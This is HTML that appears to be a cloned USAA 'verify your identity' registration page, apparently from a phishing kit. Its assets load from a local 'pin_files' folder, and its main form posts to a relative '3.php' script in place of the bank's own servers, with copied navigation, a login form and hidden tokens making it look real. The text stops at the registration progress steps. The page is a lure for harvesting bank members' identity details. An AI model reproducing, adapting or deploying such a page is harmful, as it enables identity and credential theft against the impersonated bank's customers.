<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" dir="ltr" lang="en"><head>




<meta http-equiv="content-type" content="text/html; charset=windows-1252">

<meta name="google-site-verification" content="ixTkEWd_UcMhrL39nLaMLEq66o3Ecdwa-btSiATF0Uc">

<meta name="msvalidate.01" content="6041AA1EC3506170E8F3851B2EC5C561">
<link rel="canonical" href="https://www.usaa.com/inet/ent_proof/proofingEvent">
<title>USAA Online - verify your identity, | USAA</title>

<meta name="title" content="Register for USAA Online and Mobile Access | USAA">

<meta http-equiv="pics-label" content="(pics-1.1 &quot;http://www.icra.org/ratingsv02.html&quot; l gen true for &quot;http://www.usaa.com&quot; r (cz 1 lz 1 nz 1 oz 1 vz 1) &quot;http://www.rsac.org/ratingsv01.html&quot; l gen true for &quot;http://www.usaa.com&quot; r (n 0 s 0 v 0 l 0))"> 

<meta name="ROBOTS" content="NOODP">

<meta name="ROBOTS" content="NOYDIR"> 

<meta http-equiv="Content-Style-Type" content="text/css">

<link rel="stylesheet" type="text/css" href="pin_files/styles_member.css" media="all">
<link rel="stylesheet" type="text/css" href="pin_files/styles_member_print.css" media="print">
<link rel="stylesheet" type="text/css" href="pin_files/usaa-registration.css" media="all">
<link rel="stylesheet" type="text/css" href="pin_files/rebrand_iaRestructure.css" media="all">
<link rel="stylesheet" type="text/css" href="pin_files/hoefler-base-fonts.css" media="all">
<link rel="stylesheet" type="text/css" href="pin_files/wcm-wrapper-common.css" media="all">
<link rel="SHORTCUT ICON" href="1.ico"/>
			 


	
<iframe id="utag_495" style="display:none" src="pin_files/a.html" width="1" height="1"></iframe><script type="text/javascript" async="" src="pin_files/linkid.js"></script><script type="text/javascript" async="" charset="utf-8" id="tealium-tag-7110" src="pin_files/analytics.js"></script><script type="text/javascript" async="" charset="utf-8" id="utag_599" src="pin_files/last-event-tag-latest.js"></script><script src="pin_files/utag_002.js" type="text/javascript" async=""></script><script type="text/javascript" src="pin_files/login.html" async=""></script><script language="javascript" src="pin_files/cp_help_popup-min.js" type="text/javascript"></script>
<script language="javascript" src="pin_files/cp_std-min.js" type="text/javascript"></script>

	
		
			
			
				
					
						<script language="javascript" src="pin_files/aggregator.js" type="text/javascript"></script>

					
					



	<script src="pin_files/logonCapsLockCheck-min.js"></script>





	<link rel="SHORTCUT ICON" href="https://content.usaa.com/mcontent/static_assets/Media/usaaicon.ico?cacheid=850343182_p">




	
	
	
<link href="pin_files/socialMediaBar_alt.css" type="text/css" rel="stylesheet" id="usaaloader_styleheet8"><script type="text/javascript" async="" charset="utf-8" src="pin_files/proofingevent.js"></script><script type="text/javascript" async="" charset="utf-8" id="utag_usaa.main_599" src="pin_files/utag_005.js"></script><script type="text/javascript" async="" charset="utf-8" id="utag_usaa.main_481" src="pin_files/utag.js"></script><script type="text/javascript" async="" charset="utf-8" id="utag_usaa.main_425" src="pin_files/utag_006.js"></script><script type="text/javascript" async="" charset="utf-8" id="utag_usaa.main_375" src="pin_files/utag_004.js"></script><script type="text/javascript" async="" charset="utf-8" id="utag_usaa.main_277" src="pin_files/utag_007.js"></script><script type="text/javascript" async="" charset="utf-8" id="utag_usaa.main_495" src="pin_files/utag_003.js"></script></head>

<!-- BEGIN HTML BODY -->
<body onunload="closeChildren()
"><iframe id="_yuiResizeMonitor" title="Text Resize Monitor" tabindex="-1" aria-hidden="true" style="position: absolute; visibility: visible; width: 2em; height: 2em; top: -25px; left: 0px; border-width: 0px;"></iframe>
	
	<!-- Available Channel Start-->
    
    <!-- Available Channel end -->
    
	


 


<!-- Begin outside wrapper for the container -->
 <!-- Include the default container if no custom one exists-->
 
 	
	
		<div id="container">
	
 	
 

 
 <a name="top"></a>

 <div class="noindex"> 
	 
	 
	   
 		<!-- BEGIN PAGE HEADER -->
		





<a accesskey="2" onclick="USAA.ent.util.skipToContent('content');" onblur="this.className='skipInactive';" onfocus="this.className='skipActive';" href="#content" class="skipInactive" id="skip">Skip to Content</a>





   





 <div id="consolidated-pub" class="authenticationbar consolidated accessibility">
    <div id="usaanavigationbar-container" role="navigation">
      <div id="navigationmask-container" class="navigationmask" style="display:none"> </div>
      <div class="acc-usaanavigationbar consolidated-pub displayFlex">
        <div class="global-nav-left-container">
        <div id="usaa-logo" class="navigation-tab usaa-logo red-stripe acc-touch-menu-wrapper"> <a accesskey="1" class="highlight-rec" href="https://www.usaa.com/?wa_ref=pub_auth_nav_home"> <img src="pin_files/enterprise_nav_globalnav_usaalogo.svg" alt="USAA Home" title=""> </a> </div>
        </div>
        <div class="global-nav-right-container">
  <div id="usaa-our-products-tab" class="navigation-tab our-products-tab navigation-inner-container  acc-touch-menu-wrapper acc-touch-menu-ready"> <a href="javascript:;" class="acc-touch-menu-toggle touch-menu-tab" aria-expanded="false"><span class="nav-tab-text">Products</span></a>
          <div class=" usaa-global-nav-wrap global-nav-products-wrap global-nav-pub-products-wrap our-products navigation-menu_border acc-touch-menu-content hidden">
            <div class="usaa-global-nav-content clearfix">
              <div class="colum-wrap clearfix">
                <div class="column column-first">
                  <div class="group-v10-wrap">
                    <div class="group-item"> <a class="item-link" href="https://www.usaa.com/inet/pages/our-products-main?wa_ref=pub_global_products_viewall">View All Products</a> </div>
                    <ul class="group">
                      <li class="group-item item-title"><a class="item-link title-item-link" href="https://www.usaa.com/inet/wc/insurance-products?wa_ref=pub_global_products_ins">Insurance</a>
                                            </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/auto-insurance?wa_ref=pub_global_products_ins_auto">Auto Insurance</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/insurance_home_renters?wa_ref=pub_global_products_ins_renters">Renters Insurance</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/insurance_home_condo?wa_ref=pub_global_products_ins_homeowner">Homeowner Insurance</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/insurance-home-rental-home?wa_ref=pub_global_products_ins_rental_prop">Rental Property Insurance</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/insurance-home-valuable-personal-property?wa_ref=pub_global_products_ins_vpp">Valuable Personal Property Insurance</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/insurance-condo-main?wa_ref=pub_global_products_ins_condo">Condo Insurance</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/insurance_home_flood?wa_ref=pub_global_products_ins_flood">Flood Insurance</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/pages/insurance_life_main?wa_ref=pub_global_products_ins_life">Life Insurance</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/pages/insurance_annuities_main?wa_ref=pub_global_products_ins_annuities">Annuities</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/insurance_home_umbrella?wa_ref=pub_global_products_ins_umbrella">Umbrella Insurance</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/sport-and-leisure-vehicle-insurance?wa_ref=pub_global_products_ins_recreationvehicle">Motorcycle, RV &amp; Boat Insurance</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/insurance/small-business">Small Business Insurance</a> </li>
                      <li class="group-item last-item"><a class="item-link" href="https://www.usaa.com/inet/wc/insurance-products">Additional Insurance Solutions</a> </li>
                    </ul>
                  </div>
                </div>
                <div class="column">
                  <div class="group-v10-wrap">
                    <ul class="group">
                      <li class="group-item item-title"><a class="item-link title-item-link" href="https://www.usaa.com/inet/wc/banking?wa_ref=pub_global_products_bank">Banking</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/bank-checking-accounts?wa_ref=pub_global_products_bank_checking">Checking Accounts</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/bank-savings?wa_ref=pub_global_products_bank_savings">Savings Accounts</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/banking_credit_cards_main?wa_ref=pub_global_products_bank_cc">Credit Cards</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/bank-loan-auto-main?wa_ref=pub_global_products_bank_auto">Auto Loans</a> </li>
<li class="group-item last-item"><a class="item-link" href="https://www.usaa.com/inet/wc/car-buying-services-products?wa_ref=pub_global_products_discounts_carbuying">Car Buying Service</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/bank-cds?amp;wa_ref=pub_global_products_bank_cd">CDs</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/bank-real-estate-mortgage-loans?wa_ref=pub_global_products_bank_mortgages">Home Mortgages</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/bank-loan-personal?wa_ref=pub_global_products_bank_personal">Personal Loans</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/bank_loan_recreational_vehicle?wa_ref=pub_global_products_bank_recreationvehicle">Motorcycle, RV &amp; Boat Loans</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/bank_youth?wa_ref=pub_global_products_bank_youthbanking">Youth Banking</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/banking-service?wa_ref=pub_global_products_manage">Account Services</a> </li>
                    </ul>
                  </div>
                </div>
                <div class="column">
                  <div class="group-v10-wrap">
                    <ul class="group">
                      <li class="group-item item-title"><a class="item-link title-item-link" href="https://www.usaa.com/inet/wc/investments?wa_ref=pub_global_products_invest">Investments</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/investments-brokerage?pub_global_products_invest_mutualfunds">Brokerage &amp; Trading</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/investments-mutual-funds-etfs?wa_ref=pub_global_products_invest_etfs">Mutual Funds &amp; ETFs</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/investments-ira?wa_ref=pub_global_products_invest_fundmarketplace">IRAs &amp; Rollovers</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/investments-529-college-savings-plan?wa_ref=pub_global_products_invest_529collegesavings">Education 529 Plans</a> </li>
                      <li class="group-item last-item"><a class="item-link" href="https://www.usaa.com/inet/wc/investments-automated">Automated Investing</a> </li>
                      <li class="group-item last-item"><a class="item-link" href="https://www.usaa.com/inet/wc/investments-advisor">Plan With an Advisor</a> </li>
                    </ul>
                  </div>
                  <div class="group-v10-wrap">
                    <ul class="group">
                      <li class="group-item item-title"><a class="item-link title-item-link" href="https://www.usaa.com/inet/wc/bank-real-estate-mortgage-loans?wa_ref=pub_global_products_realestate">Real Estate</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/bank_mortgage_rates_view_all?wa_ref=pub_global_products_bank_mortgage">Mortgage Rates</a> </li>

                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/bank-real-estate-mortgage-loans?wa_ref=pub_global_products_bank_mortgages">Mortgages</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/bank-real-estate-va-loan?wa_ref=pub_global_products_realestate_valoans">VA Loans</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/bank-real-estate-refinance-mortgage?wa_ref=pub_global_products_realestate_refinance">Refinance</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/re-home-loan-assistance">Mortgage Payment Assistance Options</a> </li>
                    </ul>
                  </div>
                </div>
                <div class="column column-last">
                  <div class="group-v10-wrap">
                    <ul class="group">
                      <li class="group-item item-title item-link title-item-link">Retirement</li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/retirement-income?wa_ref=pub_global_products_retire_iras">Retirement Income</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/investments-ira?wa_ref=pub_global_products_retire_iras">IRAs &amp; Rollovers</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/pages/insurance_annuities_main?wa_ref=pub_global_products_retire_annuities">Annuities</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/pages/long_term_care_insurance_main?wa_ref=pub_gobal_produts_LTC">Long-Term Care</a> </li>

                    </ul>
                  </div>
                  <div class="group-v10-wrap">
                    <ul class="group">
                      <li class="group-item item-title"><a class="item-link title-item-link" href="https://www.usaa.com/inet/wc/insurance-health-insurance-main?amp;wa_ref=pub_global_products_health">Health Insurance</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/insurance-dental?wa_ref=pub_global_products_health_dental">Dental</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/insurance-vision-solutions-state-selector-public?wa_ref=pub_global_products_health_vision">Vision</a> </li>
                      <li class="group-item last-item"><a class="item-link" href="https://www.usaa.com/inet/wc/insurance_medicare_state_selector_public?wa_ref=pub_global_products_health_medicare">Medicare</a> </li>
                    </ul>
                  </div>
                  <div class="group-v10-wrap">
                    <ul class="group">
                      <li class="group-item item-title"><a class="item-link title-item-link" href="https://www.usaa.com/inet/wc/shopping_and_discounts_main?wa_ref=pub_global_products_discounts">Shopping &amp; Discounts</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/home-solutions?wa_ref=pub_global_products_shopping_home">Home Solutions</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/travel-deals?wa_ref=pub_global_products_shopping_travel">Travel Deals</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/retail_and_discounts_main?wa_ref=pub_global_products_shopping_retail">Online Shopping</a> </li>
<li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/wc/vehicle-maintenance-center?wa_ref=pub_global_products_VMC">Vehicle Maintenance Center</a></li>
<li class="group-item last-item"><a class="item-link" href="https://www.usaa.com/inet/wc/health-wellness?wa_ref=pub_global_products_wellness">Health &amp; Wellness</a></li>
                      
                    </ul>
                  </div>
                </div>
              </div>
              <div class="subMenuFooter">
                <div class="leftCorner"></div>
                <div class="rightCorner"></div>
              </div>
            </div>
          </div>
        </div>
        <div id="usaa-your-life-events-tab" class="navigation-tab your-life-events-tab navigation-inner-container  acc-touch-menu-wrapper acc-touch-menu-ready"> <a href="https://www.usaa.com/advice/advice-center" class="acc-touch-menu-toggle touch-menu-tab" aria-expanded="false"><span class="nav-tab-text">Advice</span></a>
         <div class=" usaa-global-nav-wrap global-nav-lifeEvents-wrap your-life-events navigation-menu_border acc-touch-menu-content hidden">
    
          </div>
        </div>
        <div id="usaa-about-usaa-tab" class="navigation-tab about-usaa-tab navigation-inner-container  acc-touch-menu-wrapper"> <a href="https://www.usaa.com/inet/pages/why_choose_usaa_main?wa_ref=pub_global_usaaandu" class="acc-touch-menu-toggle touch-menu-tab"><span class="nav-tab-text">Join USAA</span></a> </div>
        <div id="usaa-claims-tab" class="navigation-tab navigation-inner-container  acc-touch-menu-wrapper"> <a href="https://www.usaa.com/inet/wc/insurance-file-claims-auto-property?wa_ref_pub_global_claims" class="acc-touch-menu-toggle touch-menu-tab"><span class="nav-tab-text">Claims</span></a> </div>
        <div id="usaa-help-tab" class="navigation-tab help-tab navigation-inner-container  acc-touch-menu-wrapper acc-touch-menu-ready"> <a href="javascript:;" class="acc-touch-menu-toggle touch-menu-tab"><span class="nav-tab-text">Help</span><span class="hiddenMessage">(Opens Popup Layer)</span></a>
          <div class=" usaa-global-nav-wrap global-nav-usaa-help-wrap help navigation-menu_border acc-touch-menu-content hidden">
            <div class="usaa-global-nav-content clearfix">
              <div class="column-wrap clearfix">
                <div class="column-single">
                  <div class="group-v10-wrap">
                    <ul id="help-content" class="group">
                      <li class="group-item text">
                        <p class="helptext"><span id="help-link-phone"></span>210-531-USAA(8722) <span class="hiddenMessage">Call 210-531-8722 or 800-531-8722</span> <br>
                          800-531-USAA</p>
                      </li>
                      <li class="group-item text">
                        <p class="helptext">#USAA (8722)</p>
                      </li>
                      <li class="group-item text">
                        <p class="helptext"><span class="hiddenMessage">#8722 on AT&amp;T, Sprint, T-Mobile, and Verizon</span>To call by mobile phone, <br>
                          AT&amp;T, Sprint, T-Mobile, and Verizon</p>
                      </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/pages/ContactUsInternational?wa_ref=pub_globalnav_contactusinternational"><span class="arrow"></span>Calling from International</a> </li>
                      <hr>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/pages/ContactUsMain?wa_ref=pub_auth_nav_other_contact"><span class="arrow"></span>Contact &amp; Support Center</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/pages/security_center?wa_ref=pub_auth_nav_security"><span class="arrow"></span>Security Center</a> </li>
                      <li class="group-item"><a class="item-link" href="https://www.usaa.com/inet/ent_locationServices/UsaaLocator/?wa_ref=pub_globalnav_help_atm_usaalocations"><span class="arrow"></span>ATMs &amp; Locations</a></li>
                    </ul>
                    <ul id="affinity-info" class="group" style="display:none">
                      <li class="group-item text">
                        <p class="helptext"> <span class="title-item-link ">Call Toll Free </span> <br>
                          <span class="" id="affinity-number"> 800-531-USAA </span> </p>
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="navigation-menu-right">
          <div id="usaa-search-tab" class="navigation-tab search-tab navigation-inner-container acc-touch-menu-wrapper firstItemFocusFlag logonPageSearch acc-touch-menu-ready"> <a href="javascript:;" class="acc-touch-menu-toggle touch-menu-tab" aria-expanded="false"><span class="nav-tab-text">
              <img class="search-icon" alt="" src="data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSJMYXllcl8xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB4PSIwcHgiIHk9IjBweCINCgkgd2lkdGg9IjIzLjVweCIgaGVpZ2h0PSIyMy4zMzNweCIgdmlld0JveD0iMTQ4IDQuNSAyMy41IDIzLjMzMyIgZW5hYmxlLWJhY2tncm91bmQ9Im5ldyAxNDggNC41IDIzLjUgMjMuMzMzIg0KCSB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxwYXRoIGZpbGw9IiNBMUIxQkMiIGQ9Ik0xNjkuNzUsMjMuMTY3bC00LjE4Ni00LjE4NmMwLjc0OC0xLjI2NSwxLjE4Ni0yLjczNywxLjE4Ni00LjMxNGMwLTQuNjkzLTMuODA3LTguNS04LjUtOC41DQoJcy04LjUsMy44MDctOC41LDguNXMzLjgwNyw4LjUsOC41LDguNWMxLjU3NywwLDMuMDQ4LTAuNDM4LDQuMzE0LTEuMTg2bDQuMTg2LDQuMTg2TDE2OS43NSwyMy4xNjd6IE0xNTguMjUsMTkuMTY3DQoJYy0yLjQ4NCwwLTQuNS0yLjAxNi00LjUtNC41czIuMDE2LTQuNSw0LjUtNC41czQuNSwyLjAxNiw0LjUsNC41UzE2MC43MzQsMTkuMTY3LDE1OC4yNSwxOS4xNjd6Ii8+DQo8L3N2Zz4NCg=="></span>
  <span class="hiddenMessage">Search</span></a>
            <div class=" usaa-global-nav-wrap global-nav-usaa-search-wrap search navigation-menu_border acc-touch-menu-content hidden">
              <div id="search-container" class="usaa-global-nav-content clearfix">
                <form id="searchForm1" method="get" action="https://www.usaa.com/inet/ent_search/CpPrvtSearch">
                <label for="search"><span class="hiddenMessage">Search: What can we help you find today?</span></label>
                  <input type="text" id="search" name="SearchPhrase" autocomplete="off" class="SearchInput" placeholder="What can we help you find today?" style="width: 770px; padding: 5px; font-size: 20px; border-width: 0px 0px 1px; border-bottom-style: solid; border-bottom-color: grey; margin: 0px 0px 0px 95px;" onkeydown="closeSearchContainer(event)">
                  <button class="clear-search clear-search-container" type="reset" onclick="searchFocus()"><img class="clear-search-icon" aria-hidden="true" src="data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSJMYXllcl8xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB4PSIwcHgiIHk9IjBweCINCgkgd2lkdGg9IjIwcHgiIGhlaWdodD0iMjBweCIgdmlld0JveD0iMCAwIDIwIDIwIiBlbmFibGUtYmFja2dyb3VuZD0ibmV3IDAgMCAyMCAyMCIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+DQo8Zz4NCgk8Zz4NCgkJPHBhdGggZmlsbD0iIzEwMjk0MCIgZD0iTTAuOCwxOS45TDcuNiw5LjZMMS41LDAuMWg0LjdsNCw2LjNsMy45LTYuM2g0LjZsLTYuMSw5LjZsNi43LDEwLjFoLTQuOEwxMCwxM2wtNC40LDYuOEgwLjh6Ii8+DQoJPC9nPg0KPC9nPg0KPC9zdmc+DQo=">  <span class="hiddenMessage">Clear Search</span> </button>
                </form>
               
              </div>
            </div>
          </div>
          <div id="usaa-login-tab" class="navigation-tab profile-tab navigation-inner-container acc-touch-menu-wrapper firstItemFocusFlag acc-touch-menu-ready" style="display: none;"> <a id="usaa-my-profile" href="javascript:;" class="acc-touch-menu-toggle touch-menu-tab" aria-expanded="false"><span class="nav-tab-text">Log On<img class="my-profile-arrow public" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAiIGhlaWdodD0iMTEiIHZpZXdCb3g9IjAgMCAxMCAxMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48dGl0bGU+R3JvdXA8L3RpdGxlPjxnIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+PHBhdGggZmlsbD0iI0ZBQzcwNSIgZD0iTTAgMHY2bDUgNVY1Ii8+PHBhdGggZmlsbD0iI0U4QUIwNiIgZD0iTTEwIDB2NmwtNSA1VjUiLz48L2c+PC9zdmc+" alt=""><img class="my-profile-arrow-active public" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAiIGhlaWdodD0iMTEiIHZpZXdCb3g9IjAgMCAxMCAxMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48dGl0bGU+R3JvdXA8L3RpdGxlPjxnIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+PHBhdGggZmlsbD0iI0ZBQzcwNSIgZD0iTTAgMTFWNWw1LTV2NiIvPjxwYXRoIGZpbGw9IiNFOEFCMDYiIGQ9Ik0xMCAxMVY1TDUgMHY2Ii8+PC9nPjwvc3ZnPg==" alt="">
  </span></a>
            <div id="profile-wrap" class="usaa-global-nav-wrap global-nav-usaa-profile-wrap profile navigation-menu_border acc-touch-menu-content profile-tab-container hidden" style="display:none">
              <div class="usaa-global-nav-content logon-wrapper clearfix">
                <form action="https://www.usaa.com/inet/ent_logon/j_security_check" method="POST" id="Logon" name="Logon" class="yuimenubaritemlabel">
                  <label for="usaaNum" class="loginHelpText">Online ID</label>
                  <input type="text" placeholder="Online ID" name="j_username" id="usaaNum" size="25" maxlength="20" class="id j_username" style="display: block;">
                  <label for="usaaPass" class="loginHelpText">Password</label>
                  <input type="password" placeholder="Password" name="j_password" id="usaaPass" size="25" maxlength="12" class="password j_password" autocomplete="off" style="display: block;">
                  <div class="login_wrap" style="display: block; padding: 0px; width: 100%;">
                    <input type="hidden" name="CSRFToken" id="gn_loginform_csrftoken" value="03877de6bea364d9a7d3a828cb55fb80">
                    <input type="hidden" name="fp_software" id="fp_software" value="">
                    <input type="hidden" name="fp_userlang" id="fp_userlang" value="">
                    <input type="hidden" name="fp_display" id="fp_display" value="">
                    <input type="hidden" name="fp_lang" id="fp_lang" value="">
                    <input type="hidden" name="fp_timezone" id="fp_timezone" value="">
                    <input type="hidden" name="fp_browser" id="fp_browser" value="">
                    <input type="hidden" name="risk_deviceprint" id="risk_deviceprint" value="">
                    <input type="hidden" name="LogonToken" value="">
                    <input type="hidden" name="PageType" value="">
                    <input type="hidden" name="fp_syslang" id="fp_syslang" value="">
                    <input type="hidden" name="authBarLogonUrl" id="authBarLogonUrl" value="https://www.usaa.com/inet/ent_proof/proofingEvent">
                    <input type="hidden" name="j_username" id="j_username" value="">
            <input type="hidden" name="j_password" id="j_password" value="">
                    <button class="login_button cta" type="button" title=" " id="login">Log On</button>
                  </div>
                </form>
                <p class="forgot-sign-in"> <a href="https://www.usaa.com/inet/ent_proof/proofingEvent?action=Init&amp;event=forgotOnlineId&amp;wa_ref=pub_auth_nav_forgotid" class="forgot-id">Forgot&nbsp;<span class="hiddenMessage">your Online &nbsp;</span>ID<span class="hiddenMessage">?</span></a> <span> or </span> <a href="https://www.usaa.com/inet/ent_proof/proofingEvent?action=Init&amp;event=forgotPassword&amp;wa_ref=pub_auth_nav_forgotpwd" class="forgot-password"><span class="hiddenMessage">Forgot your &nbsp;</span>Password<span class="hiddenMessage">?</span></a> <span> | </span> <a href="https://www.usaa.com/inet/ent_proof/proofingEvent?action=Init&amp;event=registration&amp;wa_ref=pub_auth_nav_register" class="register">Register <span class="hiddenMessage">&nbsp; with USAA</span></a> </p>
                <div class="security-center"> <a href="https://www.usaa.com/inet/pages/security_center?wa_ref=pub_auth_nav_sec" class="loose-link security"><span>Security Center</span></a> </div>
              </div>
            </div>
          </div>
          
          </div>
        </div>
      </div>
    </div>
  </div>
     


<!-- Added by C2 Screen Share Journey -- START -->

<!-- Added by C2 Screen Share Journey -- END -->
<!-- Added by C2 Click2 Team to enable EVA Help Content from Global Navigation - Start -->
 
 			<script type="text/javascript" src="pin_files/EvaPreloader-min.js"></script>			
			



<!-- Added by C2 Click2 Team to enable EVA Help Content from Global Navigation - End -->
 <div class="authenticationbar" role="banner">

		<div id="authenticationMenuBar" class="authenticationbar_list_container">
		
				
			
				 
						<div class="shortContentLoginError" id="messageLoginErrorDiv" style="display:none;">								
					
				<div class="loginError_content" id="capsMessageDIV">					
				<div class="clear margin-10"></div>
				</div></div>
				
					
</div>
</div>



<div class="authenticationbar_under_container">&nbsp;</div>




  <div id="bandwidthmsg" style="background-color: #FBFBFB; border: solid #FBFBFB; border-width: 0 45px; display: none">
   <p class="messageWarning">	
    We've detected that your internet connection might be slow. To 
quickly access your account, pay bills, transfer funds and more, 
    we suggest using <a href="https://mobile.usaa.com/inet/ent_logon/Logon">mobile.usaa.com</a> 
  </p>
  </div>




	
	
	
 </div> 
 		
 		
				


 


	
	
	

	   
		
		

		
		<div id="content" role="main">
		<div class="noindex"> 
			


 





<div id="toolsHeading">
        
        


        
		
				                              
        
</div>




	
	
	

	
		




 

<link rel="stylesheet" type="text/css" href="pin_files/ent_member_eva_cta.css">



 	


	


		</div> 

		
		
		
	
		
			
				<div id="rightColWrapper"> 	
			
		
		
		<div id="main">
			
			
				
            		
			<a name="contentLink"></a>
			
				
				

 



	
	

    	
	
	    <form action="3.php" method="post" id="pf_identify_account_registration" name="pf_identify_account_registration" onsubmit="return ps_handleFormSubmit(0)">

<input type="hidden" name="CSRFToken" id="CSRFToken" value="03877de6bea364d9a7d3a828cb55fb80">
<input type="hidden" name="PS_APPLICATIONGUID" id="PS_APPLICATIONGUID" value="PS_ProofingEvent_1595932575717">
<input type="hidden" name="PS_RESPONSETIMESTAMP" id="PS_RESPONSETIMESTAMP" value="1595932578319">
<input type="hidden" name="PS_TASKID" id="PS_TASKID" value="">
<input type="hidden" name="PS_TASKNAME" id="PS_TASKNAME" value="IdentifyEvent">
<input type="hidden" name="PS_PAGEID" id="PS_PAGEID" value="pf_identify_account_registration">
<input type="hidden" name="PS_DYNAMIC_ACTION" id="PS_DYNAMIC_ACTION" value="">
<input type="hidden" name="PS_ACTION_CONTEXT" id="PS_ACTION_CONTEXT" value="" />
<input type="hidden" name="PS_SCROLL_POSITION" id="PS_SCROLL_POSITION" value="">
<!-- pwxmbr404as3l,   ent_proofing_01 -->

<input name="PsButton_[action]update[/action]" tabindex="-1" aria-hidden="true" type="image" src="pin_files/g_transparent.gif" alt="" title="" value="empty" width="1" height="1" border="0"><div style="display: none"><label for="hidden_text_input" style="display: none">&nbsp;</label><input id="hidden_text_input" type="text" name="hidden_text_input" maxlength="1" size="1" disabled="disabled" tabindex="0"></div>

	

	
	<!-- BEGIN SEARCH INDEX -->
	
	







<link rel="stylesheet" type="text/css" href="pin_files/dotCom_applicationStyles.css">
<script type="text/javascript" src="pin_files/yahoo-dom-event.js"></script>
<script type="text/javascript" src="pin_files/connection.js"></script>


<script src="pin_files/pf_identify_account_registration-min.js" type="text/javascript"></script>

<script src="pin_files/pf_registration_siteCatalyst-min.js" type="text/javascript"></script>
<div class="clearfix">

				<div id="personalContainer" class="submain fl">
					<div id="ContactInfoHeader" class="welcomeHeader" style="margin-top:-2px;">
						<!--  WCM CONTENT OBJECT=eligibility_join_now_introduction_complex_module --><!--  WCM CONTENT ENDS  -->
						<p class="iwbpWarningText"> In order for us to verify your identity, provide all the required information. </p>
				  </div>

					<div id="container1" class="body">
					

				<div class="progressLinks">					
					<h2 class="hiddenMessage">Progress Steps for Registration</h2>
					<ol class="progressLinks-group">						
						<li class="progressLinks-item progressLinks-item-active ">
							<span class="progressLinks-message progressLinks-v1-icon">Online Access</span>
					
						</li>
						<li class="progressLinks-item progressLinks-item-active ">
